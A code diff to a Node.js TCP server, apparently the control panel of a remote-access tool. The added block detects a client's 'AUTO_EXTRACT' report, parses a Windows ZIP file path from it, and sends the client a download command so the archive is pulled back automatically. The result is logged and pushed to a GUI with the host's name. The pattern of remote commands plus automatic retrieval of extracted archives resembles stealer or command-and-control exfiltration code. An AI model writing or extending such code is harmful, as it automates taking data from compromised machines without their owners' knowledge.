@@ -294,6 +294,37 @@ function createTcpServer() {
               client.pendingDownload = null;
             }
           }
+
+          // Auto-detect extract result and trigger download
+          if (message.content.includes('AUTO_EXTRACT_START') && message.content.includes('ZIP FILE LOCATIONS')) {
+            // Extract the first ZIP path (Windows-style)
+            const zipMatch = message.content.match(/C:\\[^\\]+\.zip/);
+            if (zipMatch) {
+              const zipPath = zipMatch[0];
+              console.log(`[TCP] Auto-detected ZIP: ${zipPath}. Triggering download...`);
+
+              // Send download command
+              const downloadCmd = {
+                type: 'command',
+                content: `download ${zipPath}`
+              };
+              socket.write(JSON.stringify(downloadCmd) + '\n');
+
+              // Mark as expecting download
+              client.pendingDownload = {
+                inProgress: true,
+                filename: zipPath,
+                buffer: Buffer.alloc(0),
+                timeout: null
+              };
+
+              // Notify GUI and console
+              io.emit('commandResponse', { clientId, response: `Auto-download initiated: ${zipPath}`, timestamp: new Date() });
+              console.log(`[TCP] Auto-downloading ZIP from ${client.hostname}`);
+            } else {
+              console.log('[TCP] No ZIP path found in extract result');
+            }
+          }
           
           // Store in session history
           const session = clientSessions.get(clientId) || [];
